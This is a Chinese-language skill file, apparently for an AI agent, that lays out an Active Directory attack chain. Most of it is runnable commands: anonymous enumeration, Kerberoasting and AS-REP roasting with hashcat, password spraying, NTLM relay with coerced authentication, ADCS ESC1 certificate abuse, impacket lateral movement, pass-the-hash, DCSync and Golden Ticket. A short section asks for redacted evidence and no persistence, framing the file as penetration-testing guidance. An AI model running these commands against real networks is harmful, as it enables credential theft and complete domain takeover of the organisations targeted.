---
name: ad-attack
description: Active Directory / 内网凭据攻击（Kerberoast/AS-REP/ADCS/中继/横向）时调用该skill。
---

# Active Directory 攻击链

前提：已获得内网可达点（VPN/跳板/SSRF 隧道）。目标顺序：**枚举 → 凭据 → 权限提升 → 横向 → 域控**。

## 0. 环境确认

```bash
nmap -Pn -p 88,135,139,389,445,464,636,3268,5985,5986,9389 <DC>
ldapsearch -x -H ldap://<DC> -s base namingContexts
smbclient -L //<DC> -N
```

无凭据：`enum4linux` 风格手工（rpcclient `enumdomusers`、`querydominfo`）、`ldapsearch -x` 匿名绑定、SMB 空会话。

## 1. 用户与委派枚举

```bash
rpcclient -U '' -N <DC> -c 'enumdomusers'
ldapsearch -x -H ldap://<DC> -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName userAccountControl servicePrincipalName
ldapdomaindump -u 'DOMAIN\user' -p 'pass' <DC>
bloodhound-python -u user -p pass -d corp.local -ns <DC> -c All
```

重点：`userAccountControl`（DONT_EXPIRE_PASSWORD、PASSWD_NOTREQD）、`servicePrincipalName`、`msDS-AllowedToDelegateTo`、ACL（GenericAll/WriteDACL/ForceChangePassword）。

## 2. 凭据获取

- **Kerberoast**：`impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC> -request` → `hashcat -m 13100`。
- **AS-REP Roast**：`impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC> -format hashcat` → `-m 18200`。
- **密码喷洒**：`hydra -L users.txt -p 'Season2026!' smb://<DC>`；注意锁定策略，先 1 个密码全用户。
- **NTLM 中继**：`impacket-ntlmrelayx -tf targets.txt -smb2support` + 触发源（`responder` 或强制认证：PetitPotam/PrinterBug/DFSCoerce）。中继到 LDAP 可加计算机账户（`--add-computer`）。
- **ADCS**：`certipy find -u user@corp.local -p pass -dc-ip <DC> -vulnerable` → ESC1（模板允许请求者指定 SAN）、ESC4（模板 ACL 可写）、ESC8（HTTP 端点 NTLM 中继）。
  - ESC1：`certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local`
  - 拿 PFX：`certipy auth -pfx admin.pfx -dc-ip <DC>` → NT hash。

## 3. 权限提升与横向

- 凭据可用即横向：`impacket-psexec`、`impacket-wmiexec`、`impacket-smbexec`、`impacket-atexec`、WinRM(`evil-winrm`)。
- `impacket-secretsdump -just-dc-user krbtgt` / `-just-dc`（谨慎，量大）。
- 本地管理员哈希复用（Pass-the-Hash）：`psexec -hashes :NTHASH`。
- 委派滥用：非约束委派（打印守护进程）、约束委派（S4U2Self/S4U2Proxy）。
- 域控：DCSync（需 Replicating Directory Changes 权限）、Golden Ticket（krbtgt 哈希）、ADCS CA 私钥导出。

## 4. 证据与克制

- 每个步骤保留命令 + 原始输出；哈希/票据**脱敏**记录，不在报告里贴完整凭据。
- 默认**不落持久化**（不建账号、不改 ACL、不装服务），除非交战明确要求并书面确认。
- DCSync/黄金票据这类高影响动作，先在报告中提出并等确认，或仅证明权限存在（读 ACL）即可。

## 工具

`impacket` 全套 · `ldapdomaindump` · `bloodhound-python` · `certipy-ad` · `kerbrute` · `smbclient/rpcclient` · `ldapsearch` · `hashcat`（13100/18200/1000）· `hydra` · `chisel`（隧道）。
